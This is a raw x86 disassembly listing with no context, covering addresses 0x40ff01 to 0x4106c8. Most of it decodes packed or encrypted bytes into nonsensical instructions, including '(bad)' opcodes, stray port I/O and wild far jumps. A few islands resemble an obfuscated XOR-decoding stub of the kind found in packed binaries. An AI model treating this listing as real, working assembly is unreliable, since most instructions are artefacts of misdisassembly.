  40ff01:	imul   edi,edx,0x75671343
  40ff07:	test   al,0x29
  40ff09:	sub    eax,0xa6d0f6cf
  40ff0e:	data16 loope 0x40fea8
  40ff11:	aaa    
  40ff12:	adc    eax,0xaad2926b
  40ff17:	shl    DWORD PTR [edi+ecx*8+0x5a22778e],cl
  40ff1e:	loopne 0x40ff3d
  40ff20:	(bad)  
  40ff23:	xor    BYTE PTR [edx+ecx*1+0x2b],dl
  40ff27:	ror    BYTE PTR [ebp-0x26],cl
  40ff2a:	mov    ecx,0x187f70c0
  40ff2f:	push   esp
  40ff30:	mov    ecx,0x8897a9ad
  40ff35:	imul   edi,DWORD PTR [edx-0x23dddac0],0xd53110d1
  40ff3f:	lods   eax,DWORD PTR ds:[esi]
  40ff40:	and    dh,BYTE PTR [edx-0x3dead99e]
  40ff46:	mov    ebx,0x75a2ff35
  40ff4b:	or     BYTE PTR [ebp-0x4b],0x5a
  40ff4f:	in     al,0xa8
  40ff51:	and    DWORD PTR [edi-0x43],ebx
  40ff54:	ins    BYTE PTR es:[edi],dx
  40ff55:	xor    dl,BYTE PTR [eax-0x74]
  40ff58:	add    eax,0xf65dd427
  40ff5d:	add    al,BYTE PTR [edx-0x16]
  40ff60:	xor    eax,0x71c09531
  40ff65:	mov    edx,0xf5edf4ca
  40ff6a:	xchg   DWORD PTR [ebp+0x6c],eax
  40ff6d:	xor    esp,ebp
  40ff6f:	mov    ch,0x7c
  40ff71:	and    ecx,DWORD PTR [ebp-0x26fc0031]
  40ff77:	iret   
  40ff78:	push   esi
  40ff79:	test   al,0xb6
  40ff7b:	(bad)  
  40ff7c:	popf   
  40ff7d:	or     bl,ah
  40ff7f:	ins    BYTE PTR es:[edi],dx
  40ff80:	test   eax,0x8fff2191
  40ff85:	push   esp
  40ff86:	inc    edi
  40ff87:	xchg   ecx,eax
  40ff88:	adc    eax,0x80ddba56
  40ff8d:	xchg   esp,eax
  40ff8e:	in     al,dx
  40ff8f:	ret    
  40ff90:	cmp    DWORD PTR [ebx-0x58],ebp
  40ff93:	bound  esi,QWORD PTR [ebx-0x65]
  40ff96:	sbb    BYTE PTR [ecx],cl
  40ff98:	push   ss
  40ff99:	dec    esi
  40ff9a:	dec    eax
  40ff9b:	dec    esp
  40ff9c:	jge    0x41000a
  40ff9e:	test   BYTE PTR [bx+di-0x69],dh
  40ffa2:	adc    ch,al
  40ffa4:	clc    
  40ffa5:	cmp    BYTE PTR [ebx+0x63177633],bh
  40ffab:	je     0x40ffe1
  40ffad:	jp     0x40ff5e
  40ffaf:	xor    bl,BYTE PTR [ecx+0x58]
  40ffb2:	or     al,0xd8
  40ffb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffb5:	jnp    0x410014
  40ffb7:	lds    esi,FWORD PTR [ebx]
  40ffb9:	mov    ds:0xb933d6f5,eax
  40ffbe:	rcr    DWORD PTR [edx+eax*8-0x775df830],cl
  40ffc5:	mov    eax,ds:0x402cd1b0
  40ffca:	mov    eax,0x309f8525
  40ffcf:	xchg   ecx,eax
  40ffd0:	fistp  WORD PTR ds:0xa3702ff7
  40ffd6:	in     eax,0x2d
  40ffd8:	imul   edi,ebx,0xaf270be0
  40ffde:	xor    BYTE PTR [ebx+0x5c],dl
  40ffe1:	push   0xffffffe4
  40ffe3:	push   esp
  40ffe4:	pop    esi
  40ffe5:	mov    WORD PTR [eax+0x18],es
  40ffe8:	clc    
  40ffe9:	imul   edi,DWORD PTR [eax],0xffffffff
  40ffec:	xlat   BYTE PTR ds:[ebx]
  40ffed:	xchg   esp,eax
  40ffee:	test   esi,ebp
  40fff0:	fisttp QWORD PTR [edx]
  40fff2:	stos   BYTE PTR es:[edi],al
  40fff3:	mov    ecx,0x69b76eac
  40fff8:	pop    es
  40fff9:	(bad)  
  40fffa:	fisttp QWORD PTR [ecx]
  40fffc:	leave  
  40fffd:	sahf   
  40fffe:	xor    BYTE PTR [esi-0x5ffea000],al
  410004:	adc    al,0x74
  410006:	dec    edx
  410007:	shl    BYTE PTR [ebx+0xf],0x7d
  41000b:	in     al,dx
  41000c:	xlat   BYTE PTR ds:[ebx]
  41000d:	adc    BYTE PTR [eax],al
  41000f:	in     al,dx
  410010:	aad    0xf1
  410012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410013:	es loopne 0x40ffa6
  410016:	daa    
  410017:	mov    es,WORD PTR [edi+0x1de19658]
  41001d:	aam    0xc
  41001f:	sti    
  410020:	popf   
  410021:	push   ds
  410022:	out    0xa0,al
  410024:	push   ebx
  410025:	push   ebx
  410026:	cld    
  410027:	fstp   QWORD PTR [ebx-0x431ec323]
  41002d:	inc    ebp
  41002e:	retf   
  41002f:	add    BYTE PTR [esi-0xfa27472],bl
  410035:	sub    ebx,edi
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	aas    
  410069:	pop    eax
  41006a:	mov    dh,0x9c
  41006c:	out    0x48,eax
  41006e:	js     0x4100e8
  410070:	in     eax,0x7e
  410072:	js     0x4100ec
  410074:	div    DWORD PTR [ecx+0x5b]
  410077:	xor    DWORD PTR [ebx+ebx*1+0x70341256],ebx
  41007e:	push   ds
  41007f:	adc    ebx,DWORD PTR [esi-0x32]
  410082:	cmp    BYTE PTR [ecx+0x2c],dl
  410085:	or     BYTE PTR [ebx],cl
  410087:	adc    ebx,DWORD PTR [edi-0x56]
  41008a:	add    eax,0xa5d9f8fd
  41008f:	dec    ecx
  410090:	jl     0x4100d6
  410092:	dec    ebx
  410093:	loop   0x4100cf
  410095:	das    
  410096:	stos   BYTE PTR es:[edi],al
  410097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410098:	jb     0x410080
  41009a:	fstp   DWORD PTR [ebx]
  41009c:	(bad)  
  41009d:	sbb    eax,DWORD PTR [edi-0x52af37e8]
  4100a3:	fstp   DWORD PTR fs:[edx+0x46]
  4100a7:	jmp    0xeff34fd9
  4100ac:	cld    
  4100ad:	out    0x9b,al
  4100af:	idiv   BYTE PTR [edx+edi*8+0x19fe0cb]
  4100b6:	jp     0x4100a8
  4100b8:	or     eax,0xcbac5242
  4100bd:	je     0x4100ba
  4100bf:	inc    ebp
  4100c0:	dec    edx
  4100c1:	aad    0x92
  4100c3:	(bad)  
  4100c4:	mov    WORD PTR [eax+ecx*1],ss
  4100c7:	and    esi,DWORD PTR [ebp+0x6412f174]
  4100cd:	les    edx,FWORD PTR [esi]
  4100cf:	and    dl,bh
  4100d1:	pop    esi
  4100d2:	stos   DWORD PTR es:[edi],eax
  4100d3:	adc    eax,0xac076b7e
  4100d8:	and    eax,0x2d8857d7
  4100dd:	jg     0x4100dd
  4100df:	fmul   st,st(3)
  4100e1:	retf   0xb26f
  4100e4:	pusha  
  4100e5:	mov    dh,0x88
  4100e7:	and    bh,cl
  4100e9:	popa   
  4100ea:	(bad)  
  4100eb:	dec    edi
  4100ec:	dec    esi
  4100ed:	out    dx,eax
  4100ee:	mov    ds:0x8ea9de61,al
  4100f3:	push   ds
  4100f4:	rcl    DWORD PTR [edx-0x4e26b5a9],cl
  4100fa:	popf   
  4100fb:	jp     0x410141
  4100fd:	mov    ebx,0x2273a2ca
  410102:	mov    ecx,0x403e332d
  410107:	repnz ss gs xchg edi,eax
  41010b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41010c:	or     eax,0x359e5fbf
  410111:	and    al,0x91
  410113:	int3   
  410114:	push   esp
  410115:	mov    BYTE PTR [ecx+0xb],0xb2
  410119:	je     0x410103
  41011b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41011c:	nop
  41011d:	(bad)  
  41011e:	mov    al,ds:0x993bb5f9
  410123:	hlt    
  410124:	mov    bl,BYTE PTR [ebp-0x37]
  410127:	je     0x4100c7
  410129:	fdiv   DWORD PTR [ebp-0x3a]
  41012c:	(bad)  
  41012d:	int    0xde
  41012f:	sbb    esp,esp
  410131:	xor    BYTE PTR [ecx+ebx*4+0xaa5a9bc],dl
  410138:	jecxz  0x41018f
  41013a:	push   esp
  41013b:	jo     0x4100c2
  41013d:	fbld   TBYTE PTR [esi]
  41013f:	aaa    
  410140:	out    0x6d,eax
  410142:	or     DWORD PTR [edi],0x5a9a46a
  410148:	inc    ecx
  410149:	mov    cs,WORD PTR [edi-0x5d]
  41014c:	mov    esp,0xdfa133f
  410151:	sub    DWORD PTR [esi+0x4254e84e],edi
  410157:	mov    BYTE PTR [edx],ch
  410159:	(bad)  
  41015a:	int3   
  41015b:	jo     0x410195
  41015d:	fsubr  st,st(7)
  41015f:	xor    dh,BYTE PTR [ecx-0x35]
  410162:	push   es
  410163:	es xchg esi,eax
  410165:	scas   al,BYTE PTR es:[edi]
  410166:	cmp    eax,0x37931248
  41016b:	cs dec edi
  41016d:	daa    
  41016e:	inc    edi
  41016f:	dec    esp
  410170:	cmp    ch,dl
  410172:	dec    esi
  410173:	cmp    dh,BYTE PTR [ebp+0x27660846]
  410179:	(bad)  
  41017a:	in     al,0xcb
  41017c:	xor    bh,ah
  41017e:	rcl    DWORD PTR [eax],cl
  410180:	push   edi
  410181:	fld    TBYTE PTR [eax+0x1]
  410184:	ss nop
  410186:	sbb    eax,0x1a764d62
  41018b:	(bad)  
  41018c:	inc    BYTE PTR [edi+0x6f]
  41018f:	push   ss
  410190:	ja     0x410155
  410192:	loopne 0x410162
  410194:	push   cs
  410195:	add    al,BYTE PTR [edi]
  410197:	xchg   DWORD PTR [esi],ecx
  410199:	call   DWORD PTR [ebp+0x69975d29]
  41019f:	xchg   BYTE PTR [ecx-0x1671e55b],al
  4101a5:	outs   dx,DWORD PTR ds:[esi]
  4101a6:	push   ds
  4101a7:	pop    esi
  4101a8:	arpl   WORD PTR ds:0x813217cf,cx
  4101ae:	out    0x6a,eax
  4101b0:	pop    edx
  4101b1:	aad    0x11
  4101b3:	jno    0x410181
  4101b5:	xchg   ecx,eax
  4101b6:	adc    al,0x92
  4101b8:	push   edi
  4101b9:	dec    edx
  4101ba:	mov    ds:0xf423a649,al
  4101bf:	out    0xee,al
  4101c1:	xor    BYTE PTR [ebp-0x5a],dh
  4101c4:	lds    edx,FWORD PTR [ecx]
  4101c6:	idiv   BYTE PTR [ebp-0x3e0e322]
  4101cc:	shr    DWORD PTR [ebp-0x50],cl
  4101cf:	inc    ebp
  4101d0:	jnp    0x41019d
  4101d2:	xor    al,0xc3
  4101d4:	ins    DWORD PTR es:[edi],dx
  4101d5:	add    eax,0x7ba8b744
  4101da:	call   0x13a4:0x865c5684
  4101e1:	scas   eax,DWORD PTR es:[edi]
  4101e2:	and    bh,al
  4101e4:	xchg   BYTE PTR [edi-0x24854362],ah
  4101ea:	cmp    eax,0xc10c00d8
  4101ef:	add    dl,BYTE PTR [ecx]
  4101f1:	inc    eax
  4101f2:	pop    esp
  4101f3:	in     al,dx
  4101f4:	adc    ecx,ebx
  4101f6:	mov    esp,0x81d4a468
  4101fb:	mov    ch,0x92
  4101fd:	fwait
  4101fe:	sbb    al,0xf3
  410200:	xchg   esp,eax
  410201:	pop    ebp
  410202:	sbb    BYTE PTR [esi+0x67ff0821],al
  410208:	or     BYTE PTR [eax+0x2d2cffd5],al
  41020e:	rcl    ah,1
  410210:	outs   dx,BYTE PTR ds:[esi]
  410211:	call   0x4044:0xd9c6c1ad
  410218:	in     eax,0x50
  41021a:	stos   BYTE PTR es:[edi],al
  41021b:	mov    ebx,0x330be775
  410220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410221:	xchg   ebx,eax
  410222:	repnz int 0x7a
  410225:	cmp    al,0xcc
  410227:	dec    edi
  410228:	retf   
  410229:	js     0x4101c2
  41022b:	es in  eax,dx
  41022d:	pop    ebp
  41022e:	cmp    DWORD PTR [edi*2-0x24523723],esp
  410235:	xchg   edi,eax
  410236:	cmp    eax,0xa2e19948
  41023b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41023c:	fidiv  DWORD PTR [eax-0x416f5152]
  410242:	and    ch,BYTE PTR [ecx+0x5291025e]
  410248:	mov    cl,0x8c
  41024a:	adc    BYTE PTR [ecx],dl
  41024c:	mov    dh,0x1e
  41024e:	out    dx,al
  41024f:	xor    al,0xbf
  410251:	dec    edi
  410252:	fs (bad) 
  410254:	lods   al,BYTE PTR ds:[esi]
  410255:	loopne 0x410247
  410257:	mov    ebp,0x5ca96976
  41025c:	pop    esp
  41025d:	push   esi
  41025e:	push   ds
  41025f:	mov    bh,cl
  410261:	arpl   WORD PTR [esi],di
  410263:	(bad)  
  410264:	out    0x4,eax
  410266:	std    
  410267:	lock aam 0x6d
  41026a:	cmp    cl,BYTE PTR [edi-0x479354b2]
  410270:	les    ebx,FWORD PTR [esi-0x12d80ecb]
  410276:	adc    BYTE PTR [edx],bl
  410278:	aad    0xce
  41027a:	(bad)  [eax-0x4e]
  41027d:	mov    ebx,0x57114c19
  410283:	rcl    BYTE PTR ds:0x1a8d2715,cl
  410289:	push   es
  41028a:	mov    al,ds:0xa1cdaa11
  41028f:	out    dx,eax
  410290:	or     al,0x52
  410292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410293:	pop    ds
  410294:	mov    ebp,0xcc5dedb7
  410299:	xchg   ecx,eax
  41029a:	jmp    0x4102e1
  41029c:	pusha  
  41029d:	mov    edx,0x2026ef5d
  4102a2:	jno    0x4102ab
  4102a4:	mov    ebp,0xfa2256e4
  4102a9:	loope  0x410296
  4102ab:	scas   al,BYTE PTR es:[edi]
  4102ac:	cmp    BYTE PTR [ebx+0x3],cl
  4102af:	jnp    0x410249
  4102b1:	(bad)  
  4102b2:	out    0xa5,eax
  4102b4:	fcomp  DWORD PTR [ecx-0x3]
  4102b7:	(bad)  
  4102b8:	xlat   BYTE PTR ds:[ebx]
  4102b9:	push   ebx
  4102ba:	fwait
  4102bb:	in     eax,dx
  4102bc:	out    0xe1,al
  4102be:	or     DWORD PTR [ebp-0x78],ebx
  4102c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102c2:	push   edi
  4102c3:	imul   esi,eax,0xffffffa5
  4102c6:	sbb    eax,edx
  4102c8:	out    0xf5,eax
  4102ca:	add    ebp,DWORD PTR cs:[ebx-0x6537cba6]
  4102d1:	mov    es,ebp
  4102d3:	or     esp,DWORD PTR [esp+eiz*4-0x48]
  4102d7:	nop
  4102d8:	cdq    
  4102d9:	mov    ebx,0x27b9a08f
  4102de:	dec    esi
  4102df:	add    edx,ecx
  4102e1:	jmp    0x410569
  4102e6:	ret    
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	cmp    eax,0x4ca490aa
  4102f7:	dec    esi
  4102f8:	js     0x410372
  4102fa:	in     eax,0x7e
  4102fc:	js     0x410376
  4102fe:	fwait
  4102ff:	and    ah,BYTE PTR [ebx]
  410301:	adc    BYTE PTR [esi],0xd0
  410304:	loope  0x410366
  410306:	lods   eax,DWORD PTR ds:[esi]
  410307:	lds    esi,FWORD PTR [edi+0x7a7f017b]
  41030d:	cmc    
  41030e:	push   ebx
  41030f:	inc    ecx
  410310:	xchg   edx,ebp
  410312:	jg     0x410390
  410314:	stos   DWORD PTR es:[edi],eax
  410315:	ficomp WORD PTR [ebp-0x6fafadf6]
  41031b:	jecxz  0x410319
  41031d:	mov    fs,WORD PTR [ebx+edx*8+0x6fac1e75]
  410324:	sbb    al,0xad
  410326:	sbb    DWORD PTR [edx],ebx
  410328:	mov    DWORD PTR [ebx+ebp*1-0xd],esp
  41032c:	sbb    BYTE PTR [eax],ch
  41032e:	mov    ch,0xb4
  410330:	js     0x410318
  410332:	dec    edi
  410333:	pusha  
  410334:	sub    ah,BYTE PTR [esi+edi*8-0x2e6f8e67]
  41033b:	js     0x410321
  41033d:	sbb    al,0x61
  41033f:	jo     0x4103c0
  410341:	retf   0xcf88
  410344:	(bad)  
  410345:	jg     0x41036c
  410347:	fild   QWORD PTR [ebx-0x5a]
  41034a:	sbb    BYTE PTR [ebp-0x5c],0x4c
  41034e:	test   al,0x42
  410350:	je     0x410338
  410352:	add    al,0x12
  410354:	icebp  
  410355:	and    BYTE PTR [eax-0x5e],0xf8
  410359:	fild   QWORD PTR [edx]
  41035b:	adc    ecx,esp
  41035d:	jle    0x4103b2
  41035f:	or     al,ch
  410361:	sub    cl,BYTE PTR [ecx+0x38f0078f]
  410367:	pop    esp
  410368:	push   ds
  410369:	cld    
  41036a:	outs   dx,DWORD PTR ds:[esi]
  41036b:	adc    eax,0xf4bf0733
  410370:	stc    
  410371:	push   0x74c4360c
  410376:	dec    ebp
  410377:	std    
  410378:	lahf   
  410379:	nop
  41037a:	mov    al,gs:0x935046cd
  410380:	ds jno 0x410303
  410383:	jl     0x41034c
  410385:	fld    TBYTE PTR [ebx+0x6b63aafb]
  41038b:	jo     0x410310
  41038d:	pop    ecx
  41038e:	aas    
  41038f:	mov    BYTE PTR [ecx],0x9c
  410392:	add    bl,ch
  410394:	out    0x4d,eax
  410396:	mov    esp,0x5680255
  41039b:	or     eax,0x6df6fb6e
  4103a0:	(bad)  
  4103a1:	pop    esi
  4103a2:	push   0x1bf72f7d
  4103a7:	out    dx,al
  4103a8:	mov    ch,0x76
  4103aa:	lods   eax,DWORD PTR ds:[esi]
  4103ab:	mov    ds:0x6de833e0,eax
  4103b0:	dec    esp
  4103b1:	jns    0x410372
  4103b3:	int3   
  4103b4:	pop    esi
  4103b5:	leave  
  4103b6:	(bad)  
  4103b7:	test   BYTE PTR [esi-0x67],0xb8
  4103bb:	call   0x3876:0x209bf113
  4103c2:	pop    es
  4103c3:	and    ebx,esp
  4103c5:	cmp    BYTE PTR [ebp-0x3b79b43f],ch
  4103cb:	pop    ebx
  4103cc:	imul   ebx,DWORD PTR [ecx+0x734745],0x61
  4103d3:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103d5:	fild   QWORD PTR [ebx]
  4103d7:	xchg   ebx,eax
  4103d8:	push   ebp
  4103d9:	and    BYTE PTR [ebp-0x48],bh
  4103dc:	mov    ds,ebp
  4103de:	dec    eax
  4103df:	out    0x7f,eax
  4103e1:	or     ah,bh
  4103e3:	mov    eax,0x6e215bc3
  4103e8:	scas   eax,DWORD PTR es:[edi]
  4103e9:	psrad  mm6,QWORD PTR [ebx+0x57fa1497]
  4103f0:	loopne 0x4103d9
  4103f2:	add    DWORD PTR [eax+0x398cbc50],esp
  4103f8:	or     DWORD PTR [edx],edi
  4103fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103fb:	into   
  4103fc:	sbb    BYTE PTR [edi+0x5f],ch
  4103ff:	push   eax
  410400:	(bad)  
  410401:	loopne 0x4103f4
  410403:	ins    BYTE PTR es:[edi],dx
  410404:	jmp    0xa4be46c8
  410409:	jns    0x4103eb
  41040b:	inc    eax
  41040c:	mov    dh,BYTE PTR [eax-0x32dc2c2e]
  410412:	pop    ss
  410413:	push   edi
  410414:	jne    0x4103e9
  410416:	dec    ecx
  410417:	(bad)  
  410418:	xor    BYTE PTR [ecx+edi*4+0x37aa7b62],ch
  41041f:	ds loop 0x41048b
  410422:	adc    al,0x7b
  410424:	push   ecx
  410425:	mov    ebp,0xf8885b3a
  41042a:	das    
  41042b:	cmp    eax,0xde133c2
  410430:	or     al,0xd7
  410432:	jmp    DWORD PTR [bx+si]
  410435:	loop   0x410400
  410437:	jg     0x4103ee
  410439:	mov    dh,0x7e
  41043b:	push   0x74
  41043d:	and    al,0xd3
  41043f:	push   eax
  410440:	jns    0x410429
  410442:	xchg   ecx,eax
  410443:	retf   0x2fd5
  410446:	into   
  410447:	call   0x842f:0xe8d2556
  41044e:	add    BYTE PTR [edx],al
  410450:	mov    eax,0x952fb8f3
  410455:	(bad)  
  410456:	cld    
  410457:	rcr    dh,1
  410459:	retf   
  41045a:	pop    esi
  41045b:	pop    ecx
  41045c:	xchg   edx,eax
  41045d:	js     0x410479
  41045f:	in     al,0x8
  410461:	aam    0x6d
  410463:	sti    
  410464:	or     al,0xcd
  410466:	lock jmp 0xb46c:0x93a595d2
  41046e:	sbb    cl,al
  410470:	jle    0x410412
  410472:	sar    BYTE PTR [edi],0x83
  410475:	out    dx,al
  410476:	outs   dx,DWORD PTR ds:[esi]
  410477:	popf   
  410478:	pop    ecx
  410479:	add    BYTE PTR [ebx-0x40],dh
  41047c:	mov    ebp,0xbb6b1926
  410481:	pop    ss
  410482:	add    DWORD PTR [eax+0x2e2ab517],esi
  410488:	push   eax
  410489:	out    0x62,al
  41048b:	and    ch,al
  41048d:	or     DWORD PTR [eax+0x13c8b616],esp
  410493:	out    dx,al
  410494:	(bad)  
  410495:	sbb    edx,DWORD PTR [ebx-0x70]
  410498:	fst    QWORD PTR [ebx]
  41049a:	inc    ebp
  41049b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41049c:	ja     0x410450
  41049e:	sbb    al,0x3d
  4104a0:	pop    ecx
  4104a1:	fs inc ecx
  4104a3:	div    BYTE PTR [ecx]
  4104a5:	lods   eax,DWORD PTR ds:[esi]
  4104a6:	push   ds
  4104a7:	(bad)  
  4104a8:	out    dx,al
  4104a9:	pop    ebx
  4104aa:	sbb    esi,0x6a
  4104ad:	clc    
  4104ae:	pop    ebx
  4104af:	and    DWORD PTR [edi+0x4c68180f],ecx
  4104b5:	mov    dh,0xbd
  4104b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104b8:	loope  0x41047a
  4104ba:	sbb    bl,BYTE PTR [esi+0x5a07eae8]
  4104c0:	cli    
  4104c1:	iret   
  4104c2:	pop    esi
  4104c3:	sbb    ecx,DWORD PTR [edx-0x47]
  4104c6:	pop    es
  4104c7:	and    cl,BYTE PTR [eax]
  4104c9:	dec    ebp
  4104ca:	shl    DWORD PTR [edx+0x67],cl
  4104cd:	shl    bl,1
  4104cf:	test   BYTE PTR [ebp-0x530dc612],cl
  4104d5:	pop    ss
  4104d6:	inc    ebx
  4104d7:	and    al,0x29
  4104d9:	jnp    0x410461
  4104db:	inc    edi
  4104dc:	sbb    ch,BYTE PTR [esi]
  4104de:	sub    eax,0x5913b5c9
  4104e3:	lock lahf 
  4104e5:	in     eax,dx
  4104e6:	mov    esi,0xa2311e90
  4104eb:	push   eax
  4104ec:	(bad)  
  4104ed:	(bad)  
  4104ef:	retf   
  4104f0:	out    0x97,eax
  4104f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104f3:	jle    0x4104ab
  4104f5:	(bad)  
  4104f6:	adc    BYTE PTR [ebx-0x209eb997],al
  4104fc:	cmp    eax,0x659d5836
  410501:	pop    esi
  410502:	push   0x9e4cae53
  410507:	mov    BYTE PTR [ebx+0x3cd77205],al
  41050d:	dec    ecx
  41050e:	jl     0x410512
  410510:	ss or  cl,ah
  410513:	fstp   QWORD PTR [esi]
  410515:	icebp  
  410516:	cld    
  410517:	mov    eax,0x15731d86
  41051c:	jle    0x4104ec
  41051e:	xor    BYTE PTR [esp+ebp*1+0x7a],bh
  410522:	pusha  
  410523:	sbb    BYTE PTR [edi+0xf3671a1],dl
  410529:	test   eax,0x55eb9c3d
  41052e:	je     0x410510
  410530:	cmc    
  410531:	xor    al,0xe
  410533:	(bad)
  410536:	lods   eax,DWORD PTR ds:[esi]
  410537:	mov    eax,ds:0xe1c5f7a5
  41053c:	test   BYTE PTR [ebx-0x35417078],dl
  410542:	outs   dx,BYTE PTR ds:[esi]
  410543:	dec    eax
  410544:	arpl   WORD PTR [ebx],ax
  410546:	cmp    ah,cl
  410548:	loope  0x410537
  41054a:	leave  
  41054b:	lods   eax,DWORD PTR ds:[esi]
  41054c:	repnz xor al,0x20
  41054f:	arpl   WORD PTR [ebp+0x5d],ax
  410552:	dec    ebx
  410553:	ror    BYTE PTR [esi+edx*2+0x5],1
  410557:	jl     0x4104ff
  410559:	mov    al,0xf8
  41055b:	clc    
  41055c:	inc    esi
  41055d:	rol    DWORD PTR [eax],cl
  41055f:	push   0x0
  410561:	inc    edi
  410562:	sbb    ah,BYTE PTR [edx+0x9ce6f54]
  410568:	push   0x8bd7af0f
  41056d:	jge    0x410567
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	mov    esi,0x39e7bc66
  410588:	push   ebx
  410589:	js     0x410603
  41058b:	in     eax,0x7e
  41058d:	js     0x410607
  41058f:	(bad)  
  410590:	or     edi,DWORD PTR [ebx+0x1b]
  410593:	nop
  410594:	lahf   
  410595:	adc    BYTE PTR [esi-0x2166d8a8],cl
  41059b:	lea    ebx,[esi]
  41059d:	(bad)  
  41059e:	jmp    0xd706bd0
  4105a3:	stc    
  4105a4:	xor    ax,WORD PTR [esi+eax*1+0x64d6e287]
  4105ac:	(bad)  
  4105ad:	mov    edi,0x7ec91666
  4105b2:	in     eax,dx
  4105b3:	pop    esi
  4105b4:	jp     0x410572
  4105b6:	scas   al,BYTE PTR es:[edi]
  4105b7:	sbb    al,BYTE PTR [edi+0x1]
  4105ba:	rol    BYTE PTR [edi-0x5e],0x2f
  4105be:	arpl   WORD PTR [esi+0x74],sp
  4105c1:	test   al,0xf3
  4105c3:	cs xchg ebp,eax
  4105c5:	mov    ch,0x20
  4105c7:	rep ins BYTE PTR es:[edi],dx
  4105c9:	cmp    DWORD PTR [eax],edi
  4105cb:	cmp    ah,BYTE PTR [ebx]
  4105cd:	sub    ah,dl
  4105cf:	pusha  
  4105d0:	sahf   
  4105d1:	addr16 jmp 0x3f7c:0x3484879d
  4105d9:	jo     0x410622
  4105db:	bound  ecx,QWORD PTR [ebp-0x206fbd4b]
  4105e1:	xor    al,bh
  4105e3:	sbb    eax,0xdfa30a1a
  4105e8:	fsub   DWORD PTR [edi]
  4105ea:	adc    ah,dh
  4105ec:	mov    DWORD PTR [edx-0x1cd0d789],ebp
  4105f2:	bound  ebp,QWORD PTR [edi-0x79]
  4105f5:	imul   ebp,DWORD PTR [edi-0x6],0x2323000
  4105fc:	sbb    ch,BYTE PTR [esi]
  4105fe:	lock repnz adc al,0x78
  410602:	adc    eax,0x7c82d56
  410607:	pop    ds
  410608:	push   edi
  410609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41060a:	loope  0x41061c
  41060c:	sbb    BYTE PTR [ebx-0x182fd356],0x9f
  410613:	cli    
  410614:	sti    
  410615:	pop    ebp
  410616:	inc    bh
  410618:	jnp    0x41064d
  41061a:	ret    0x315d
  41061d:	xchg   edi,eax
  41061e:	xchg   ebp,eax
  41061f:	mov    ds:0xe82db9cb,al
  410624:	jecxz  0x410633
  410626:	add    DWORD PTR [ebp+0x43],eax
  410629:	pop    ebx
  41062a:	adc    esi,DWORD PTR [esi-0x169cfb19]
  410630:	sub    al,0x31
  410632:	push   eax
  410633:	nop
  410634:	dec    eax
  410635:	shr    DWORD PTR [edi],1
  410637:	push   ebx
  410638:	sbb    ebx,DWORD PTR [ebp+0x39]
  41063b:	scas   al,BYTE PTR es:[edi]
  41063c:	add    eax,DWORD PTR [eax]
  41063e:	sub    BYTE PTR [eax+edx*4],0xfb
  410642:	in     eax,0x76
  410644:	adc    BYTE PTR [esi+0x1846446d],al
  41064a:	adc    eax,0x738be94
  41064f:	xchg   BYTE PTR [eax+0x2b],bl
  410652:	xor    ch,BYTE PTR [ecx+0x2e]
  410655:	cwde   
  410656:	cwde   
  410657:	dec    ebp
  410658:	test   BYTE PTR [ecx+0x38f41868],dl
  41065e:	call   0x1f68:0x70d0fb65
  410665:	and    dl,BYTE PTR [edx]
  410667:	xor    ecx,ecx
  410669:	push   cs
  41066a:	xor    eax,0x3a4cfff9
  41066f:	(bad)  
  410671:	jb     0x41065e
  410673:	mov    edi,DWORD PTR [ecx+0x5]
  410676:	mov    dl,0x8b
  410678:	jmp    0xe0d1b378
  41067d:	mov    bl,0x7f
  41067f:	ja     0x4106f7
  410681:	inc    ecx
  410682:	mov    BYTE PTR [edx],dh
  410684:	sub    BYTE PTR [ebx+0x33],cl
  410687:	daa    
  410688:	test   al,0x12
  41068a:	arpl   WORD PTR [eax],cx
  41068c:	inc    eax
  41068d:	or     bl,BYTE PTR [eax-0x526ba424]
  410693:	arpl   si,ax
  410695:	and    eax,0xf4cde4af
  41069a:	inc    eax
  41069b:	repz or BYTE PTR [edx+0x51c18abb],0x28
  4106a3:	pop    edi
  4106a4:	cmp    DWORD PTR [edx],ecx
  4106a6:	int3   
  4106a7:	adc    al,al
  4106a9:	stc    
  4106aa:	test   eax,0x66565d5
  4106af:	icebp  
  4106b0:	jbe    0x410680
  4106b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106b3:	cmp    al,BYTE PTR [ebx+esi*1+0x1]
  4106b7:	sbb    cl,cl
  4106b9:	jp     0x410663
  4106bb:	aam    0x8c
  4106bd:	xchg   esp,eax
  4106be:	mov    edx,0x6202ff2b
  4106c3:	mov    edi,0x39934897
  4106c8:	fwait
